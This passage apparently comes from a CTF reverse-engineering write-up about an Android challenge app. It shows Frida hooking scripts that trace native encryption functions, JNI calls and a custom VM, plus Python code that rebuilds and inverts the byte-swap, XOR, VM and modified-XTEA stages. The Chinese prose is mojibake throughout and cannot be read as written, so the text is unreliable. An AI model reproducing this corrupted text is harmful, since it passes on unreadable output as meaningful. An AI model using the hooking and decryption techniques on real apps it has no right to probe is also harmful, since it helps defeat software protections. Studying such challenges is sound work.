0x78563412æ‰€ä»¥æ­¤å¤„ bswap32(v6) , æ˜¯å¯¹ v6 è¿›è¡Œå­—èŠ‚ç¿»è½¬ï¼Œè€Œ v6 = HIDWORD(a1) , æ•…åœ¨è¿›è¡Œç¬¬ä¸€ä¸ªåŠ å¯†å‡½æ•° sub_3B9D4 ä¹‹åï¼Œå°†é¦–å…ˆå¯¹è¾“å…¥çš„é«˜ 32 ä½è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œè¿™åœ¨æˆ‘ä»¬åç»­ hook ç¬¬äºŒä¸ªåŠ å¯†å‡½æ•° sub_3A924 ä¹‹åï¼Œä¹Ÿå¯ä»¥ä½“ç°å‡ºæ¥è¿™ä¸€ç‚¹ # åŠ å¯†äºŒ BlackObfuscator æ··æ·† æˆ‘ä»¬é¦–å…ˆ hook ä¸€ä¸‹ sub_3A924 è®©å‰ååˆ†æçš„é€»è¾‘è¿è´¯èµ·æ¥ //hook ç¬¬ 2 ä¸ªåŠ å¯†å‡½æ•°ï¼Œè§‚å¯Ÿæ•°å€¼å‰åå˜åŒ–var enc2_count = 0;var input_2 = [0,0]function hook_2_enc()&#123;// è·å–æ¨¡å— var module = Process.getModuleByName(\"libsec2023.so\") // è½¬ä¸ºå‡½æ•°åœ°å€ var addr=module.base.add(\"0x3A924\"); // è·å–å‡½æ•°å…¥å£ var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('before second enc, count:',enc2_count+1); input_2[enc2_count] = args[3] console.log(hexdump(args[1],&#123; offset: 0,// ç›¸å¯¹åç§» length: 64,//dump çš„å¤§å° header: true, ansi: true &#125;)); &#125;, onLeave: function (retval) &#123; console.log('after second enc, count:',enc2_count+1); console.log(hexdump(input_2[enc2_count],&#123; offset: 0,// ç›¸å¯¹åç§» length: 64,//dump çš„å¤§å° header: true, ansi: true &#125;)); enc2_count+=1; &#125; &#125; );&#125;åœ¨ç»è¿‡ç¬¬ä¸€è½®åŠ å¯†åï¼Œæˆ‘ä»¬å¾—åˆ°äº†å¯†æ–‡ cc ca 94 6d e3 d5 39 39 , è€Œåœ¨æ­¤å¤„ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ sub_3A924 çš„è¾“å…¥ä¸º 6d 94 ca cc , ç¬¬äºŒæ¬¡è°ƒç”¨ sub_3A924 çš„è¾“å…¥ä¸º 39 39 d5 e3 , æ­£å¥½å¯¹åº”äº†ä¸Šæ–‡æåˆ°çš„ç¿»è½¬å­—èŠ‚å¤„ç† æˆ‘ä»¬è¿›å…¥è¯¥å‡½æ•°åï¼Œå‘ç°å¦‚ v11+1408LL , v11 + 1664LL ç­‰ç­‰çš„ fastcall å‡½æ•°è°ƒç”¨ï¼Œä¸€èˆ¬è¿™ç§å½¢å¼çš„å‡½æ•°è°ƒç”¨åœ¨å®‰å“é€†å‘ä¸­é‡åˆ°çš„è¯ï¼Œé‚£å¤§æ¦‚ç‡å°±æ˜¯ JNIEnv * åœ¨æ­¤é¢˜ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹ v11 æŒ‰ä¸‹ Y åˆ‡æ¢ç±»å‹ï¼Œç„¶åè¾“å…¥ JNIEnv * , å°±ä¼šè½¬æ¢æˆ JNIEnv * çš„ç»“æ„ä½“å‡½æ•°æŒ‡é’ˆå¦‚å›¾ åœ¨è¿™é‡Œå‡ºç°äº† jni å‡½æ•° GetStaticMethodID , æˆ‘ä»¬ hook ä¸€ä¸‹è¿™ä¸ªå‡½æ•°è§‚å¯Ÿè°ƒç”¨äº†ä»€ä¹ˆæ–¹æ³• //hook GetStaticMethodID function hook_GetStaticMethodID() &#123; var symbols = Module.enumerateSymbolsSync(\"libart.so\"); var addr_jni = null; for (var i = 0; i &lt; symbols.length; i++) &#123; var symbol = symbols[i]; if (symbol.name.indexOf(\"GetStaticMethodID\")!=-1) &#123; addr_jni = symbol.address; console.log(\"find \",symbol.name); console.log(\"[+] hook \",addr_jni); Interceptor.attach(addr_jni, &#123; onEnter: function (args) &#123; console.log(\"call GetStaticMethodID: \",symbol.name); console.log(\"name: \",args[2].readCString()); console.log(\"sig: \",args[3].readCString()); &#125;, onLeave: function (retval) &#123; //console.log(\"return val\") //console.log(retval); &#125; &#125;); &#125; &#125;&#125;åœ¨è¾“å‡ºä¸­ï¼Œæˆ‘ä»¬å‘ç° GetStaticMethodID è°ƒç”¨äº†åä¸º encrypt çš„æ–¹æ³• ä½†æ˜¯æˆ‘ä»¬åœ¨ apk ä¸­å´å¹¶æœªå‘ç°è¯¥æ–¹æ³• é‚£ä¹ˆç”±æ­¤å°±å¯ä»¥æ¨æ–­å‡ºè¿™ä¸ªæ–¹æ³•æ˜¯ç”± dex åŠ¨æ€åŠ è½½çš„ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ frida-dexdump æ¥æŠŠå†…å­˜ä¸­çš„ dex ç»™ dump ä¸‹æ¥ï¼Œè¦æ³¨æ„ frida çš„ç«¯å£å·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºäº† 1234 , æ‰€ä»¥è¿™é‡Œä¹Ÿè¦åŠ ä¸Š -H å‚æ•° å°†æ‰€æœ‰ dex dump ä¸‹æ¥ä¹‹åï¼Œæ¥ä¸‹æ¥çš„æ­¥éª¤å°±æ˜¯æŠŠè¿™äº› dex ä¸€ä¸ªä¸€ä¸ªæ‹–è¿› jadx é‡Œé¢åç¼–è¯‘ï¼Œå»çœ‹çœ‹å“ªä¸€ä¸ª dex åŒ…å« encrypt æ–¹æ³• è¿™ä¸ªæ§åˆ¶æµä¸€çœ¼çœ‹ä¸Šå»å°±æ˜¯åŠ äº†æ··æ·†çš„ï¼Œæ® FallW1nd å¸ˆå‚…è¯´æ˜¯ BlackObfuscator æ··æ·†ï¼Œæœ¬æ¥å‡†å¤‡å»æ‰‹å·¥åˆ†æçš„ï¼Œä½†æ˜¯æƒ³èµ·å‰å‡ å¤©åˆšä¸‹è½½äº† Jeb5.1, å°±æƒ³çœ‹çœ‹æ–°å·¥å…·çš„æ•ˆæœæ€æ · å½“æˆ‘ç”¨ Jeb5.1 åç¼–è¯‘è¿™ä¸ª dex ä¹‹åï¼Œè¿™ BlackObfuscator æ··æ·†æ€ä¹ˆå°±ç›´æ¥å»é™¤äº†ï¼Ÿï¼Ÿï¼Ÿ å¥½å®¶ä¼™è¿™ Jeb5.1 ç«Ÿç„¶èƒ½è‡ªåŠ¨å»é™¤æ§åˆ¶æµå¹³å¦åŒ–ï¼Œcrazy! é‚£ä¹ˆè¿™ç¬¬äºŒä¸ªåŠ å¯†çš„é€»è¾‘ç›¸å½“çš„æ¸…æ™°ï¼Œç®—æ³•å¦‚ä¸‹ import structdef enc_2(input): input = int.from_bytes(input.to_bytes(4, 'little'), 'big') # å­—èŠ‚å†æ¬¡ç¿»è½¬ input = (input >> 7 | input &lt;&lt; 25) &amp; 0xffffffff input_byte = bytearray(input.to_bytes(4, 'big')) xor_arr = [50, -51, -1, -104, 25, -78, 0x7C, -102] for i in range(4): input_byte[i] = (input_byte[i] ^ xor_arr[i]) &amp; 0xff input_byte[i] = (input_byte[i] + i) &amp; 0xff return int.from_bytes(input_byte, 'big')def dec_2(input): input_byte = bytearray(input.to_bytes(4, 'big')) xor_arr = [50, -51, -1, -104, 25, -78, 0x7C, -102] for i in range(4): input_byte[i] = (input_byte[i] - i) &amp; 0xff input_byte[i] = (input_byte[i] ^ xor_arr[i]) &amp; 0xff input = int.from_bytes(input_byte, 'big') input = (input &lt;&lt; 7 | input >> 25) &amp; 0xffffffff input = int.from_bytes(input.to_bytes(4, 'little'), 'big') # å­—èŠ‚å†æ¬¡ç¿»è½¬ return inputdef mytest_2(): input = int.from_bytes(b'\\xe3\\xd5\\x39\\x39\\xcc\\xca\\x94\\x6d','little') input_low, input_high = struct.unpack('>2I', input.to_bytes(8, 'little')) # å®ç° bswap32 # éªŒè¯åŠ å¯†ç®—æ³• input_high = enc_2(input_high) assert input_high.to_bytes(4, 'big') == b'\\xaa\\x17\\xd8\\x10' input_low = enc_2(input_low) assert input_low.to_bytes(4, 'big') == b'\\xf4\\xc0\\x8e\\x36' # éªŒè¯è§£å¯†ç®—æ³• input_high = dec_2(input_high) input_low = dec_2(input_low) input = struct.pack('>2I', input_low, input_high) assert input == b'\\xe3\\xd5\\x39\\x39\\xcc\\xca\\x94\\x6d'mytest_2()# æ€»è§ˆç¬¬äºŒå¤„åŠ å¯† sub_3B8CC æˆ‘ä»¬å¯ä»¥ hook ä¸€ä¸‹ç¬¬äºŒæ¬¡åŠ å¯†å‰åè¾“å…¥çš„å˜åŒ– //hook sub_3B8CC, è§‚å¯Ÿä¼ å…¥çš„å‚æ•°function hook_3B8CC()&#123; // è·å–æ¨¡å— var module = Process.getModuleByName(\"libsec2023.so\") // è½¬ä¸ºå‡½æ•°åœ°å€ var addr=module.base.add(\"0x3B8CC\"); // è·å–å‡½æ•°å…¥å£ var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log(\"\\nbefore sub_3B8CC: \",args[0]); &#125;, onLeave: function (retval) &#123; console.log(\"after sub_3B8CC: \",retval); &#125; &#125;);&#125; # å›åˆ° libil2cpp.so ä¸­ æˆ‘ä»¬åœ¨ sub_31164 ä¸­å» hook æœ€åçš„ br x2 è·³è½¬æ¥è§‚å¯Ÿä¹‹åè·³è½¬åˆ°äº†å“ªä¸€ä¸ªå‡½æ•°ä¸­ function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); console.log(addr); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; // åŒ…å« \"lib\" å­—ç¬¦ä¸²çš„ if(process_Obj_Module_Arr[i].path.indexOf(\"lib\")!=-1) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"ä½äº\",process_Obj_Module_Arr[i].name,\"ä¸­\",\"offset: \",(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125; &#125;&#125;//hook sub_311A0, æŸ¥çœ‹ BR X2 è·³è½¬çš„åœ°å€function hook_311A0()&#123; // è·å–æ¨¡å— var module = Process.getModuleByName(\"libsec2023.so\") // è½¬ä¸ºå‡½æ•°åœ°å€ var addr=module.base.add(\"0x311A0\"); // è·å–å‡½æ•°å…¥å£ var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(func, &#123; onEnter: function (args) &#123; addr_in_so(this.context.x2); &#125;, onLeave: function (retval) &#123; //console.log(hexdump(retval)); &#125; &#125;);&#125;å¯è§åœ¨ libsec2023.so ä¸­ç»è¿‡ä¸¤æ¬¡åŠ å¯†ä¹‹åï¼Œapk å›åˆ°äº† libil2cpp.so ä¸­ # åˆ†æ libil2cpp.so åç§»ä¸º 0x138d64 å¤„ åç§» 0x138d64 åŠ ä¸ŠåŸæ¥ so çš„åŸºå€åï¼Œå®šä½åˆ°äº†è¿™ä¸ªåœ°æ–¹ B è·³è½¬è¿‡å»å‘ç°å¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ FUNCTION CHUNK é‚£å…ˆä¿®æ”¹ä¸€ä¸‹ .init_proc çš„ End address ç„¶åå›åˆ°ä¹‹å‰ chunk function çš„ä½ç½®ï¼ŒæŒ‰ä¸‹ P è®© IDA åˆ†æå‡ºå‡½æ•°ï¼Œå°±å¯ä»¥çœ‹ä¼ªä»£ç ç»§ç»­åˆ†æäº† # åŠ å¯†ä¸‰ vm æŒ‡ä»¤åˆ†æ è¿™ä¸ªç±»çš„åç§°è¢« o , O , 0 ç»™æ··æ·†äº†ï¼Œå¯¼è‡´éš¾ä»¥åˆ†è¾¨ç±»å’Œå˜é‡ï¼Œæ‰€ä»¥éœ€è¦ä¸ºè¿™äº›ç±»å’Œå˜é‡è¿›è¡Œé‡å‘½å åœ¨çœ‹çœ‹å…¶ä»–å‡½æ•°ï¼Œè¿™æœ€åçš„ v6 + v8 + (v6 | ~v8) + (v8 ^ v6) - (v6 &amp; ~v8) + 1 çœ‹èµ·æ¥æ˜¯ MBA è¡¨è¾¾å¼ åœ¨ github æ‰¾ä¸ªå·¥å…· GAMBA ç®€åŒ–ä¸€ä¸‹ï¼Œæœ‰äº›è¡¨è¾¾å¼è¦åˆ†å¼€ç®€åŒ–æ•ˆæœæ‰å¥½ï¼Œè¿™é‡Œ 4294967296=0x100000000 å·²ç»æº¢å‡º 32 ä½äº†ï¼Œæ‰€ä»¥ 4294967296+v8=v8 é‡å‘½åå‡½æ•°ä¹‹åï¼Œå¾ˆæ˜æ˜¾å‘ç°è¿™ä¸ªåŠ å¯†ç®—æ³•åº”è¯¥å’Œ VM æŒ‡ä»¤ç›¸å…³ æˆ‘ä»¬å›åˆ°ç±»çš„åˆå§‹åŒ–å‡½æ•° ctor å®Œæˆä¹‹åï¼Œä¸‹ä¸€ä¸ªè¦è°ƒç”¨çš„å‡½æ•° OO0OoOOo_Oo0__oOOoO0o0 è¿›å…¥è¯¥å‡½æ•°ï¼Œåˆæ˜¯ç»å…¸çš„ while(1) å¾ªç¯ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªå¾ªç¯é‡Œé¢ï¼Œå¿…å®šä¼šå‡ºç° eip å’Œ opcode , è¿™ä¸¤ä¸ªåˆ†åˆ«å¯¹åº”ç€ this-&gt;fields.oOOO0Oo0 å’Œ U16_arr , æˆ‘ä»¬é‡å‘½åä¹‹ ä¹‹åï¼Œæˆ‘ä»¬ä»¥ add å‡½æ•°ä¸ºä¾‹åˆ†æå…¶ä»–å…¨å±€å˜é‡çš„å«ä¹‰ï¼Œè¿™é‡Œå¯¹åº”çš„ vm æŒ‡ä»¤åº”è¯¥ä¸º add uS_arr[bbb], uS_arr[bbb], uS_arr[bbb+1] åˆ°è¿™é‡Œå¯èƒ½ä¼šæœ‰äººçº ç»“ uS_arr ç©¶ç«Ÿä»£è¡¨å¯„å­˜å™¨è¿˜æ˜¯ä»£è¡¨æ ˆå‘¢ï¼Ÿæˆ‘ä»¬å›åˆ°åˆå§‹åŒ–å‡½æ•°ä¸­ï¼Œå‘ç°å˜é‡ bbb æ‰€èµ‹çš„åˆå€¼ä¸º -1 , é‚£ä¹ˆç”±æ­¤å¯ä»¥ç¡®å®šï¼Œ uS_arr ä»£è¡¨çš„æ˜¯æ ˆï¼Œè€Œ bbb åˆ™è¡¨ç¤º esp è‡³æ­¤ä¸ºæ­¢ï¼Œvm æ‰€éœ€çš„å…³é”®å˜é‡æˆ‘ä»¬å‡å·²ç»åˆ†ææ¸…æ¥šäº† æ¥ä¸‹æ¥å°±å¯ä»¥åˆ†æ vm è™šæ‹Ÿæœºäº†ï¼Œå¯¹äº vm ç±»é¢˜å‹ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ° vm æŒ‡ä»¤ä¸­çš„åŠ å‡ä¹˜é™¤ä½è¿ç®—çš„ä½ç½®å’Œè¾“å…¥è¾“å‡ºæ˜¯å¤šå°‘å°±å¤Ÿäº†ï¼Œåˆ«çš„æŒ‡ä»¤æ¯”å¦‚ push , pop , mov ,opcode æ˜¯å¤šå°‘ï¼Œopcode æ˜¯å¦‚ä½•è¢« vm è¯»å–ç­‰ç­‰è¿™äº›é—®é¢˜éƒ½ä¸éœ€è¦è€ƒè™‘ï¼Œå› ä¸ºåœ¨ vm ä¸­ï¼Œæ‰€æœ‰çš„ vm æŒ‡ä»¤çš„æœ€ç»ˆç›®çš„éƒ½æ˜¯ä¸ºäº†å¯¹è¾“å…¥çš„å€¼è¿›è¡Œæ“ä½œï¼Œæˆ‘ä»¬çŸ¥é“äº†è¿™äº›åŠ å¯†è¿ç®—ï¼Œé‚£ä¹ˆé€†è¿ç®—è‡ªç„¶æ˜¯ä¿¡æ‰‹æ‹ˆæ¥ æ‰€ä»¥åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ frida å» hook ä¸€ä¸‹è¿ç®—ç›¸å…³çš„æŒ‡ä»¤ //hook vmfunction hook_vm()&#123; var module = Process.getModuleByName(\"libil2cpp.so\") var my_base = 0x712a997000; var esp,ptr_esp,eip,ptr_eip,opcode,input,stack; var addr_run=module.base.add(0x712AE01D44-my_base); Interceptor.attach(addr_run, &#123; onEnter: function (args) &#123; opcode = ptr(args[0].add(0x10).readS64()).add(0x20); input = ptr(args[0].add(0x18).readS64()).add(0x1c); stack = ptr(args[0].add(0x20).readS64()).add(0x1c); ptr_esp = args[0].add(0x28); ptr_eip = args[0].add(0x2c); console.log(\"====start vm====\"); for(var i=1;i&lt;8;i++)&#123; console.log(\"input[\"+i+\"]=0x\"+input.add(4*i).readS32().toString(16)); &#125; &#125;, onLeave: function (retval) &#123; console.log(\"====end vm====\") &#125; &#125;); var addr_add=module.base.add(0x712AE01E50-my_base); Interceptor.attach(addr_add, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"+\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_sub=module.base.add(0x712AE01ECC-my_base); Interceptor.attach(addr_sub, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"-\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_mul=module.base.add(0x712AE01F44-my_base); Interceptor.attach(addr_mul, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"*\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_Lshift=module.base.add(0x712AE01FC4-my_base); Interceptor.attach(addr_Lshift, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"&lt;&lt;\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_Rshift=module.base.add(0x712AE02040-my_base); Interceptor.attach(addr_Rshift, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\">>\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_and=module.base.add(0x712AE020BC-my_base); Interceptor.attach(addr_and, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"&amp;\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_xor=module.base.add(0x712AE0213C-my_base); Interceptor.attach(addr_xor, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"^\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;);&#125;è¾“å‡ºä»¥åŠåˆ†æå¦‚ä¸‹ ====start vm====input[1]=0x10d817aa// è¾“å…¥çš„ä½ 32 ä½input[2]=0x368ec0f4// è¾“å…¥çš„é«˜ 32 ä½// ä½ 32 ä½è¿›è¡Œ vm åŠ å¯†stack[1]=0x10d817aa>>24stack[1]=0x10&amp;255// å–å‡ºç¬¬ 4 ä¸ªå­—èŠ‚ï¼Œå³ 0x10, æ–¹ä¾¿èµ·è§ï¼Œè®°ä¸º byte4stack[2]=0x18-8stack[2]=0x10d817aa>>16stack[2]=0x10d8&amp;255// å–å‡ºç¬¬ 3 ä¸ªå­—èŠ‚ï¼Œå³ 0xd8, è®°ä¸º byte3stack[3]=0x10-8stack[3]=0x10d817aa>>8stack[3]=0x10d817&amp;255// å–å‡ºç¬¬ 2 ä¸ªå­—èŠ‚ï¼Œå³ 0x17, è®°ä¸º byte2stack[4]=0x8-8stack[4]=0x10d817aa>>0stack[4]=0x10d817aa&amp;255// å–å‡ºç¬¬ 1 ä¸ªå­—èŠ‚ï¼Œå³ 0xaa, è®°ä¸º byte1stack[5]=0x0-8stack[4]=0xaa-27//byte1=byte1-27=0x8fstack[3]=0x17^194//byte2=byte2^194=0xd5stack[2]=0xd8+168//byte3=byte3+168=0x180stack[1]=0x10^54//byte4=byte4^54=0x26stack[1]=0x8f^0//byte1^0stack[1]=0x8f&lt;&lt;0//byte1&lt;&lt;0stack[2]=0xff&lt;&lt;0stack[1]=0x8f&amp;255stack[1]=0x8f+0stack[1]=0x4+1stack[1]=0x0+8stack[1]=0xd5^8//byte2^8stack[1]=0xdd&lt;&lt;8//byte2&lt;&lt;8stack[2]=0xff&lt;&lt;8stack[1]=0xdd00&amp;65280stack[1]=0xdd00+143stack[1]=0x5+1stack[1]=0x8+8stack[1]=0x180^16//byte3^16stack[1]=0x190&lt;&lt;16//byte3&lt;&lt;16stack[2]=0xff&lt;&lt;16stack[1]=0x1900000&amp;16711680stack[1]=0x900000+56719stack[1]=0x6+1stack[1]=0x10+8stack[1]=0x26^24//byte4^24stack[1]=0x3e&lt;&lt;24//byte4&lt;&lt;24stack[2]=0xff&lt;&lt;24stack[1]=0x3e000000&amp;-16777216stack[1]=0x3e000000+9493903// é«˜ 32 ä½è¿›è¡Œ vm åŠ å¯†stack[1]=0x7+1stack[1]=0x18+8stack[1]=0x368ec0f4>>24// å–å‡ºç¬¬ 4 ä¸ªå­—èŠ‚ï¼Œå³ 0x36, è®°ä¸º byte4stack[1]=0x36&amp;255stack[2]=0x18-8stack[2]=0x368ec0f4>>16// å–å‡ºç¬¬ 3 ä¸ªå­—èŠ‚ï¼Œå³ 0x8e, è®°ä¸º byte3stack[2]=0x368e&amp;255stack[3]=0x10-8stack[3]=0x368ec0f4>>8// å–å‡ºç¬¬ 2 ä¸ªå­—èŠ‚ï¼Œå³ 0xc0, è®°ä¸º byte2stack[3]=0x368ec0&amp;255stack[4]=0x8-8stack[4]=0x368ec0f4>>0// å–å‡ºç¬¬ 1 ä¸ªå­—èŠ‚ï¼Œå³ 0xf4, è®°ä¸º byte1stack[4]=0x368ec0f4&amp;255stack[5]=0x0-8stack[4]=0xf4-47//byte1=byte1-47=0xc5stack[3]=0xc0^182//byte2=byte2^182=0x76stack[2]=0x8e+55//byte3=byte3+55=0xc5stack[1]=0x36^152//byte4=byte4^152=0xaestack[1]=0xc5+0//byte1+0stack[1]=0xc5&lt;&lt;0//byte1&lt;&lt;0stack[2]=0xff&lt;&lt;0stack[1]=0xc5&amp;255stack[1]=0xc5+0stack[1]=0x4+1stack[1]=0x0+8stack[1]=0x76+8//byte2+8stack[1]=0x7e&lt;&lt;8//byte2&lt;&lt;8stack[2]=0xff&lt;&lt;8stack[1]=0x7e00&amp;65280stack[1]=0x7e00+197stack[1]=0x5+1stack[1]=0x8+8stack[1]=0xc5+16//byte3+16stack[1]=0xd5&lt;&lt;16//byte3&lt;&lt;16stack[2]=0xff&lt;&lt;16stack[1]=0xd50000&amp;16711680stack[1]=0xd50000+32453stack[1]=0x6+1stack[1]=0x10+8stack[1]=0xae+24//byte4+24stack[1]=0xc6&lt;&lt;24//byte&lt;&lt;24stack[2]=0xff&lt;&lt;24stack[1]=0x-3a000000&amp;-16777216stack[1]=0x-3a000000+13991621stack[1]=0x7+1stack[1]=0x18+8====end vm====input[1]=0x3e90dd8finput[2]=0x-392a813b// æ— ç¬¦å· int å¯¹åº”çš„æ˜¯ 0xc6d57ec5ç”±æ­¤å¯è§ï¼Œè¿™ä¸ª vm å…¶å®ç›¸å½“çš„ç®€å• import structdef enc_vm_low(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 27) ^ 0 byte2 = (byte2 ^ 194) ^ 8 byte3 = (byte3 + 168) ^ 16 byte4 = (byte4 ^ 54) ^ 24 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_vm_low(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 ^ 0) + 27 byte2 = (byte2 ^ 8) ^ 194 byte3 = (byte3 ^ 16) - 168 byte4 = (byte4 ^ 24) ^ 54 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def enc_vm_high(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 47) + 0 byte2 = (byte2 ^ 182) + 8 byte3 = (byte3 + 55) + 16 byte4 = (byte4 ^ 152) + 24 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_vm_high(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 0) + 47 byte2 = (byte2 - 8) ^ 182 byte3 = (byte3 - 16) - 55 byte4 = (byte4 - 24) ^ 152 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def mytest_3(): input_high = int.from_bytes(b'\\xaa\\x17\\xd8\\x10','big') input_low = int.from_bytes(b'\\xf4\\xc0\\x8e\\x36','big') input_high, input_low = input_low, input_high # å¯¹åº” sub_3B8CC æœ€å è¾“å…¥çš„é«˜ / ä½ 32 ä½äº¤æ¢ input = struct.pack('>2I', input_low, input_high) # éªŒè¯åŠ å¯†ç®—æ³• input_low, input_high = struct.unpack('&lt;2I', input) input_low = enc_vm_low(input_low) assert input_low == 0x3e90dd8f input_high = enc_vm_high(input_high) assert input_high == 0xc6d57ec5 # éªŒè¯è§£å¯†ç®—æ³• input_low = dec_vm_low(input_low) assert input_low == 0x10d817aa input_high = dec_vm_high(input_high) assert input_high == 0x368ec0f4mytest_3()# åŠ å¯†å›› xtea åˆ†æ è¿™ä¸ªç®—æ³•ä¸€çœ‹å°±çŸ¥é“æ˜¯ xtea, é‚£ä¹ˆéœ€è¦çŸ¥é“çš„å°±åªæœ‰ v24 è¿™ä¸ªå¯†é’¥äº† ç”¨ frida æŠŠå¯†é’¥ hook ä¸‹æ¥ //hook xtea åŠ å¯†çš„ keyfunction hook_xtea_key()&#123; // è·å–æ¨¡å— var module = Process.getModuleByName(\"libil2cpp.so\"); var my_base = 0x712a997000; var addr_key=module.base.add(0x712ADFCC60-my_base); // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(addr_key, &#123; onEnter: function (args) &#123; console.log(hexdump(this.context.x20,&#123; offset: 0,// ç›¸å¯¹åç§» length: 64,//dump çš„å¤§å° header: true, ansi: true &#125;)); &#125;, onLeave: function (retval) &#123; &#125; &#125;);&#125; å†æŠŠ xtea åŠ å¯†ä¹‹åçš„å€¼ä¹Ÿé¡ºä¾¿ hook ä¸‹æ¥ //hook æ‰€æœ‰åŠ å¯†å®Œæˆä¹‹åçš„å€¼ï¼Œä»¥åŠæ¯”è¾ƒçš„å€¼function hook_final_check()&#123; // è·å–æ¨¡å— var module = Process.getModuleByName(\"libil2cpp.so\"); var my_base = 0x712a997000; var addr_final_check=module.base.add(0x712ADFCD14-my_base); // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(addr_final_check, &#123; onEnter: function (args) &#123; console.log(\"result = \",this.context.x0); console.log(\"result_low = \",this.context.x21); console.log(\"result_high = \",this.context.x22); &#125;, onLeave: function (retval) &#123; &#125; &#125;);&#125; é‚£ä¹ˆè¿™éƒ¨åˆ†çš„ç®—æ³•å¦‚ä¸‹ import ctypesdef enc_xtea(input_low, input_high): v0, v1 = ctypes.c_uint32(input_low), ctypes.c_uint32(input_high) key = [0x7b777c63, 0xc56f6bf2, 0x2b670130, 0x76abd7fe] delta = 0x21524111 total1 = ctypes.c_uint32(0xBEEFBEEF) total2 = ctypes.c_uint32(0x9D9D7DDE) for i in range(64): v0.value += (((v1.value &lt;&lt; 7) ^ (v1.value >> 8)) + v1.value) ^ (total1.value - key[total1.value &amp; 3]) v1.value += (((v0.value &lt;&lt; 8) ^ (v0.value >> 7)) - v0.value) ^ (total2.value + key[(total2.value >> 13) &amp; 3]) total1.value -= delta total2.value -= delta return v0.value, v1.valuedef dec_xtea(input_low, input_high): v0, v1 = ctypes.c_uint32(input_low), ctypes.c_uint32(input_high) key = [0x7b777c63, 0xc56f6bf2, 0x2b670130, 0x76abd7fe] delta = 0x21524111 total1 = ctypes.c_uint32(0xBEEFBEEF - 64 * delta) total2 = ctypes.c_uint32(0x9D9D7DDE - 64 * delta) for i in range(64): total1.value += delta total2.value += delta v1.value -= (((v0.value &lt;&lt; 8) ^ (v0.value >> 7)) - v0.value) ^ (total2.value + key[(total2.value >> 13) &amp; 3]) v0.value -= (((v1.value &lt;&lt; 7) ^ (v1.value >> 8)) + v1.value) 